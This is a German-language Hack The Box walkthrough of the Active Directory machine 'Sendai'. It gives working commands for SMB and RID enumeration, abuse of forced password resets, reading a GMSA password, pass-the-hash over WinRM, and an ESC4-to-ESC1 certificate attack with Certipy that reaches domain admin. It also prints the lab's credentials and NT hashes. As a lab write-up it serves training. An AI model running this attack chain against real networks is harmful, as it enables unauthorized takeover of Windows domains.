# Hack The Box - Sendai (Deutsches Walkthrough)

## Synopsis

Sendai ist eine Medium-Windows-Active-Directory-Maschine mit Fokus auf schwache Account-Hygiene, GMSA-Abuse und ADCS-Fehlkonfigurationen. Der Erstzugriff erfolgt über anonyme SMB-Enumeration, bei der Hinweise auf Accounts im erzwungenen Passwort-Reset-Zustand gefunden werden. Über RID-Bruteforce und Missbrauch von `STATUS_PASSWORD_MUST_CHANGE` wird `thomas.powell` übernommen.

BloodHound zeigt anschließend einen Pfad über `GenericAll -> ADMSVC -> ReadGMSAPassword`, wodurch das GMSA-Konto `MGTSVC$` kompromittiert wird. Nach lateralem Pivot werden lokale Service-Credentials für `clifford.davey` gefunden. Dessen Rechte auf einer Zertifikat-Template ermöglichen einen `ESC4 -> ESC1`-ADCS-Angriff mit Certipy, wodurch ein Administrator-Zertifikat ausgestellt und schließlich vollständige Domänenkompromittierung erreicht wird.

## Enumeration

### Nmap

```text
ports=$(nmap -p- --min-rate=1000 -T4 sendai.vl | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p$ports -sC -sV sendai.vl
```

**Interessante Dienste:**
- 53 DNS
- 88 Kerberos
- 389 LDAP
- 445 SMB
- 636 LDAPS
- 3268 Global Catalog
- 5985 WinRM

Klarer Domain Controller.

- Domain: `sendai.vl`
- Host: `dc.sendai.vl`

### SMB Shares

**Guest Enumeration:**
```text
nxc smb dc.sendai.vl -u test -p '' --shares
```

**Interessant:**
- `sendai` READ
- `Users` READ

**Spidering:**
```text
nxc smb dc.sendai.vl -u test -p '' -M spider_plus
```

**Interessante Dateien:**
- `incident.txt`
- `guidelines.txt`

**Download:**
```text
smbclient //sendai.vl/sendai -U 'rogue%'
get incident.txt
cd security
get guidelines.txt
```

**`incident.txt` offenbart:**
- Accounts mit schwachen Passwörtern wurden expired gesetzt
- `Password must change` beim nächsten Login

## Initial Access

### RID Brute Force

```text
nxc smb dc.sendai.vl -u test -p '' --rid-brute 10000 > nxc_result.txt
cat nxc_result.txt | grep TypeUser | awk '{print $6}' | cut -d '\\' -f2 > users.txt
```

**Login mit leerem Passwort testen:**
```text
nxc smb dc.sendai.vl -u users.txt -p '' --continue-on-success
```

**Wichtig:**
- `Elliot.Yates` → `STATUS_PASSWORD_MUST_CHANGE`
- `Thomas.Powell` → `STATUS_PASSWORD_MUST_CHANGE`

Kein normales Login Failure.

### Password Reset Abuse

**Passwort setzen ohne altes Passwort:**
```text
impacket-changepasswd sendai.vl/thomas.powell:@dc.sendai.vl -newpass 'Password1'
```

**Erfolg:**
- `Password was changed successfully`

Foothold.

## GMSA Compromise

### BloodHound

```text
bloodhound-ce-python -u thomas.powell -p Password1 -d sendai.vl --zip -c All -dc dc.sendai.vl
```

**Pfad:**
- `SUPPORT`
- `GenericAll over ADMSVC`
- `ReadGMSAPassword on MGTSVC$`

### ADMSVC Abuse

**Benutzer in Gruppe hinzufügen:**
```text
bloodyAD --host 10.129.234.66 -u thomas.powell -p Password1 -d sendai.vl add groupMember ADMSVC thomas.powell
```

**GMSA Secret lesen:**
```text
netexec ldap dc.sendai.vl -u thomas.powell -p Password1 --gmsa
```

**Hash:**
- `9ed35c68b88f35007aa32c14c1332ce7`

**WinRM als `MGTSVC$`:**
```text
evil-winrm -i dc.sendai.vl -u 'mgtsvc$' -H '9ed35c68b88f35007aa32c14c1332ce7'
```

**User Flag:**
```text
C:\user.txt
```

## Lateral Movement

### Service Credential Hunting

**Registry Services prüfen:**
```powershell
dir HKLM:\SYSTEM\CurrentControlSet\services |
Get-ItemProperty |
Select-Object ImagePath |
select-string -NotMatch "svchost.exe" |
select-string "exe"
```

**Treffer:**
```text
helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p
```

**Credentials validieren:**
```text
nxc smb dc.sendai.vl -u clifford.davey -p RFmoB2WplgE_3p
```

Pivot erfolgreich.

## Privilege Escalation

### ADCS Enumeration

**BloodHound zeigt:**
- `CA-OPERATORS`
- `GenericAll`
- `SENDAICOMPUTER` template

ESC4.

### Template in ESC1 verwandeln

```text
certipy-ad template -u clifford.davey -p RFmoB2WplgE_3p -template SENDAICOMPUTER -save-old
```

Template geändert.

### Administrator-Zertifikat anfordern

```text
certipy-ad req -u clifford.davey -p RFmoB2WplgE_3p -target dc.sendai.vl -ca sendai-DC-CA -template SENDAICOMPUTER -upn administrator -sid S-1-5-21-3085872742-570972823-736764132-500
```

**Ergebnis:**
- `administrator.pfx`

### Hash extrahieren

```text
certipy-ad auth -u administrator -domain sendai.vl -pfx administrator.pfx
```

**Administrator NT Hash:**
- `cfb106feec8b89a3d98e14dcbe8d087a`

### Domain Admin

```text
evil-winrm -i dc.sendai.vl -u administrator -H cfb106feec8b89a3d98e14dcbe8d087a
```

**Root Flag:**
```text
C:\Users\Administrator\Desktop\root.txt
```

## Angriffskette Kurzüberblick

- Anonymous SMB
- Expired Password Discovery
- `STATUS_PASSWORD_MUST_CHANGE` Abuse
- `thomas.powell` Compromise
- `GenericAll -> ADMSVC`
- GMSA Password Read
- `MGTSVC$` WinRM
- Service Credential Discovery
- `clifford.davey` Pivot
- `ESC4 -> ESC1` Template Abuse
- Certificate Authentication
- Domain Admin
